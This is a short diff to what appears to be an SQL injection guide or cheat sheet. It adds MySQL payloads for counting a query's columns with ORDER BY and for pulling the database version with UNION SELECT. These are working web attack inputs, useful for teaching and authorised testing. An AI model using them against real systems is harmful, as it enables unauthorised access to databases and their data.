@@ -37,6 +37,10 @@ After stuffing the input fields you should either obtain access to the system as
 #### MySQL
 
 ```sql
+# Get number of columns
+' ORDER BY 3--
+
+# Get version, make shorter/longer depending on number of columns
 ' UNION SELECT 1, VERSION(), 3-- 
 ```
 
